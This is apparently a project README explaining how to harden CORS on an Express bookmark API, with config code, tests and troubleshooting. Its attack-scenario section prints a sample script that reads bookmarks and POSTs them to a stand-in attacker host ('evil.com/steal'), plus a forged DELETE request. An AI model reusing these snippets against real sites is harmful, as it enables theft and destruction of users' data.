# 03: CORS Hardening (Deny-by-Default)

[![Priority](https://img.shields.io/badge/Priority-High-orange)](#)
[![Complexity](https://img.shields.io/badge/Complexity-Low-green)](#)
[![Time](https://img.shields.io/badge/Time-2%20hours-blue)](#)

---

## Why This Matters

**Problem:** Without strict CORS configuration, any website can:
- **Access your API** - Evil.com can make requests to ClawChives from user's browser
- **Steal bookmarks** - Malicious sites can read sensitive data via CORS
- **Exfiltrate data** - Browser will send credentials and cookies to attacker's origin
- **Bypass authentication** - If origin is *, all sites can access protected endpoints

**Impact:** Open CORS = Open API. Any website can read/write your bookmarks, even when authenticated.

**Solution:** Deny-by-default CORS with explicit CORS_ORIGIN allowlist.

---

## What This Implements

### CORS Security Model

| Configuration | Current (Insecure) | Hardened (This Fix) |
|---------------|-------------------|---------------------|
| `origin` | `*` or permissive | `process.env.CORS_ORIGIN` (explicit allowlist) |
| `credentials` | Not set | `true` (allow cookies/auth) |
| `Production` | No validation | **Rejects startup if CORS_ORIGIN not set** |
| `Development` | Same as prod | `http://localhost:5173` (Vite default) |

### Why Deny-by-Default?

**Current CORS (server.js line 139):**
```javascript
app.use(cors({
  origin: "*", // ⚠️ INSECURE: Allows all origins
}));
```

**Attack scenario:**
1. User visits `evil.com` while logged into ClawChives
2. Evil.com JavaScript: `fetch('http://clawchives.local/api/bookmarks', {credentials: 'include'})`
3. Browser sends request with Authorization header
4. CORS allows it (origin: *)
5. Evil.com receives all bookmarks

**Hardened CORS:**
```javascript
app.use(cors({
  origin: process.env.CORS_ORIGIN || "http://localhost:5173",
  credentials: true, // Allow Authorization header
}));

// Production validation: reject if CORS_ORIGIN not explicitly set
if (process.env.NODE_ENV === 'production' && !process.env.CORS_ORIGIN) {
  console.error("FATAL: CORS_ORIGIN must be set in production");
  process.exit(1);
}
```

**Now:**
1. Evil.com tries same attack
2. Browser checks CORS: `evil.com` not in allowlist
3. Request blocked **before** reaching server
4. Console error: "CORS policy: No 'Access-Control-Allow-Origin' header"

---

## How It Works

### CORS Flow (Browser Enforcement)

```
Request from Browser:
  ├─ User visits https://clawchives.yoursite.com
  ├─ JavaScript makes API call: fetch('/api/bookmarks')
  ├─ Browser checks Origin header: https://clawchives.yoursite.com
  ├─ Browser sends preflight OPTIONS request (for non-simple requests)
  ├─ Server responds with Access-Control-Allow-Origin: https://clawchives.yoursite.com
  ├─ Browser compares: Request origin matches response origin?
  ├─ ✅ If match: Allow request, send credentials
  └─ ❌ If mismatch: Block request, log CORS error
```

### CORS Middleware Configuration

**Placement:** Line 139 in server.js (after helmet, before routes)

**Why credentials: true?**
- Allows `Authorization: Bearer` header (required for API tokens)
- Allows cookies (if using session auth)
- **Must** be paired with specific origin (not `*`)

---

## Security Rationale

### Attack Scenarios Prevented

**Cross-Site Request Forgery via CORS (Blocked):**
```
Attacker creates phishing.com with:
  <script>
    fetch('http://clawchives.local/api/bookmarks', {
      method: 'DELETE',
      headers: { 'Authorization': 'Bearer ' + stolenToken }
    });
  </script>

Without CORS hardening:
  ✅ Request succeeds (origin: * allows all)
  ❌ Bookmarks deleted

With CORS hardening:
  ❌ Request blocked by browser (phishing.com not in CORS_ORIGIN)
  ✅ Bookmarks safe
```

**Data Exfiltration (Blocked):**
```
Attacker embeds in ad network:
  fetch('http://192.168.1.100:4242/api/bookmarks')
    .then(r => r.json())
    .then(data => {
      // Send to attacker server
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });

Without CORS hardening:
  ✅ Request succeeds, bookmarks sent to evil.com

With CORS hardening:
  ❌ Blocked: Origin mismatch (ad network domain ≠ CORS_ORIGIN)
```

### OWASP Top 10 Coverage
- ✅ **A05:2021 – Security Misconfiguration** - Proper CORS configuration
- ✅ **A07:2021 – Identification and Authentication Failures** - Prevents token theft via CORS
- ✅ **A01:2021 – Broken Access Control** - CORS enforces origin-based access control

---

## Implementation

See [cors-config.ts](./cors-config.ts) for full implementation.

### Quick Overview

**1. Set environment variable:**
```bash
# Development (.env)
CORS_ORIGIN=http://localhost:5173

# Production (.env)
CORS_ORIGIN=https://clawchives.yoursite.com

# Multiple origins (comma-separated)
CORS_ORIGIN=https://clawchives.yoursite.com,https://app.yoursite.com
```

**2. Update server.js CORS configuration (line 139):**
```javascript
import { getCorsConfig } from "./src/config/corsConfig.js";

app.use(cors(getCorsConfig()));
```

**3. Add production validation (line 138, before app.listen):**
```javascript
// Reject startup if CORS_ORIGIN not set in production
if (process.env.NODE_ENV === 'production' && !process.env.CORS_ORIGIN) {
  console.error("🚨 FATAL: CORS_ORIGIN environment variable must be set in production");
  console.error("Example: CORS_ORIGIN=https://your-domain.com");
  process.exit(1);
}
```

---

## Testing

### Manual Verification

**Test 1: Check CORS headers**
```bash
# Start server with CORS_ORIGIN set
CORS_ORIGIN=http://localhost:5173 npm run start:api

# Make preflight request
curl -X OPTIONS http://localhost:4242/api/bookmarks \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: GET" \
  -v

# Expected response headers:
# Access-Control-Allow-Origin: http://localhost:5173
# Access-Control-Allow-Credentials: true
```

**Test 2: Test origin rejection**
```bash
# Try with wrong origin
curl -X OPTIONS http://localhost:4242/api/bookmarks \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -v

# Expected: NO Access-Control-Allow-Origin header
# Browser would block this request
```

**Test 3: Test production validation**
```bash
# Try to start in production without CORS_ORIGIN
NODE_ENV=production npm run start:api

# Expected:
# 🚨 FATAL: CORS_ORIGIN environment variable must be set in production
# (process exits with code 1)
```

**Test 4: Browser console test**
```javascript
// Open browser console on http://evil.com (or any non-allowed origin)
fetch('http://localhost:4242/api/health')
  .then(r => r.json())
  .then(console.log)
  .catch(console.error);

// Expected error:
// Access to fetch at 'http://localhost:4242/api/health' from origin 'http://evil.com'
// has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

### Automated Tests

Create `tests/security/cors.test.js`:
```javascript
import request from 'supertest';
import app from '../../server.js';

describe('CORS Security', () => {
  it('should allow requests from configured origin', async () => {
    const res = await request(app)
      .get('/api/health')
      .set('Origin', process.env.CORS_ORIGIN || 'http://localhost:5173');

    expect(res.headers['access-control-allow-origin']).toBe(
      process.env.CORS_ORIGIN || 'http://localhost:5173'
    );
  });

  it('should not allow requests from unknown origins', async () => {
    const res = await request(app)
      .get('/api/health')
      .set('Origin', 'http://evil.com');

    // CORS middleware won't set header for disallowed origins
    expect(res.headers['access-control-allow-origin']).toBeUndefined();
  });

  it('should include credentials header', async () => {
    const res = await request(app)
      .get('/api/health')
      .set('Origin', process.env.CORS_ORIGIN || 'http://localhost:5173');

    expect(res.headers['access-control-allow-credentials']).toBe('true');
  });

  it('should reject production startup without CORS_ORIGIN', () => {
    const oldEnv = process.env.NODE_ENV;
    const oldOrigin = process.env.CORS_ORIGIN;

    process.env.NODE_ENV = 'production';
    delete process.env.CORS_ORIGIN;

    // This should throw or exit - test with spawned process
    // expect(() => require('../../server.js')).toThrow();

    process.env.NODE_ENV = oldEnv;
    process.env.CORS_ORIGIN = oldOrigin;
  });
});
```

---

## Configuration Options

### Single Origin (Most Common)

```bash
# .env
CORS_ORIGIN=https://clawchives.yoursite.com
```

### Multiple Origins

**Option 1: Comma-separated (recommended)**
```bash
# .env
CORS_ORIGIN=https://clawchives.yoursite.com,https://app.yoursite.com,https://mobile.yoursite.com
```

**Option 2: Dynamic function in corsConfig.js**
```javascript
export function getCorsConfig() {
  const allowedOrigins = process.env.CORS_ORIGIN?.split(',') || ['http://localhost:5173'];

  return {
    origin: (origin, callback) => {
      // Allow requests with no origin (like mobile apps or curl)
      if (!origin) return callback(null, true);

      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,
  };
}
```

### Development vs Production

**Development (loose CORS for local testing):**
```javascript
const isDev = process.env.NODE_ENV !== 'production';

export function getCorsConfig() {
  if (isDev) {
    return {
      origin: ['http://localhost:5173', 'http://localhost:3000'], // Vite + CRA
      credentials: true,
    };
  }

  // Production: strict enforcement
  if (!process.env.CORS_ORIGIN) {
    throw new Error('CORS_ORIGIN must be set in production');
  }

  return {
    origin: process.env.CORS_ORIGIN,
    credentials: true,
  };
}
```

---

## Common Issues & Troubleshooting

### Issue: Browser says "CORS error" but server logs show request succeeded
**Symptom:** Server returns 200 OK, but browser console shows CORS error.

**Solution:** CORS is **browser-enforced**, not server-enforced. The request succeeds on the server, but the browser blocks the response. This is correct behavior - check that `Origin` header matches `CORS_ORIGIN`.

### Issue: Preflight OPTIONS request fails
**Symptom:** Browser sends OPTIONS request, gets 404 or no CORS headers.

**Solution:** Ensure CORS middleware is applied **before** route handlers:
```javascript
app.use(cors(getCorsConfig())); // ← MUST be before app.get(), app.post(), etc.
```

### Issue: "Credentials mode is 'include' but Access-Control-Allow-Origin is '*'"
**Symptom:** Browser error when using `credentials: true` with `origin: '*'`.

**Solution:** Cannot use wildcards with credentials. Must specify explicit origin:
```javascript
// ❌ WRONG
{ origin: '*', credentials: true }

// ✅ CORRECT
{ origin: 'https://clawchives.yoursite.com', credentials: true }
```

### Issue: Server won't start in production
**Symptom:** Process exits with "FATAL: CORS_ORIGIN must be set in production".

**Solution:** This is intentional! Set `CORS_ORIGIN` in your `.env` or Docker environment:
```bash
docker run -e CORS_ORIGIN=https://your-domain.com ...
```

### Issue: Mobile app requests blocked
**Symptom:** React Native or mobile apps can't access API (no Origin header).

**Solution:** Allow requests with no origin in CORS config:
```javascript
origin: (origin, callback) => {
  if (!origin) return callback(null, true); // Allow mobile/native apps
  // ... rest of origin check
}
```

---

## Integration with Existing Code

### Before (server.js line 139):
```javascript
app.use(cors({
  // Current config (may be permissive)
}));
```

### After:
```javascript
// ✅ ADD: Import CORS config helper
import { getCorsConfig } from "./src/config/corsConfig.js";

// ✅ REPLACE: Old CORS config with hardened config
app.use(cors(getCorsConfig()));

// ✅ ADD: Production validation (line 1100+, before app.listen)
if (process.env.NODE_ENV === 'production' && !process.env.CORS_ORIGIN) {
  console.error("🚨 FATAL: CORS_ORIGIN environment variable must be set in production");
  console.error("Example: CORS_ORIGIN=https://your-domain.com");
  process.exit(1);
}
```

**Files modified:**
- [server.js](../../server.js) - Import and apply hardened CORS config
- **New file:** `src/config/corsConfig.js` - CORS configuration helper
- [.env.example](../../.env.example) - Add `CORS_ORIGIN=http://localhost:5173`
- [docker-compose.yml](../../docker-compose.yml) - Add `CORS_ORIGIN` environment variable

**Breaking changes:**
- ⚠️ Production deployment **requires** `CORS_ORIGIN` to be set (intentional)
- ⚠️ Requests from non-allowed origins will be blocked (this is the goal)

---

## Next Steps

1. ✅ Review this README
2. ✅ Review [cors-config.ts](./cors-config.ts)
3. ⬜ Create `src/config/corsConfig.js` with hardened config
4. ⬜ Update server.js CORS middleware
5. ⬜ Add production validation before app.listen()
6. ⬜ Set `CORS_ORIGIN` in .env files
7. ⬜ Test with browser from allowed/disallowed origins
8. ⬜ Verify production startup rejection without CORS_ORIGIN
9. ⬜ Proceed to [04-input-validation](../04-input-validation/README.md)

---

## References

- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP: CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [Express CORS Middleware](https://expressjs.com/en/resources/middleware/cors.html)
- [PortSwigger: CORS Vulnerabilities](https://portswigger.net/web-security/cors)
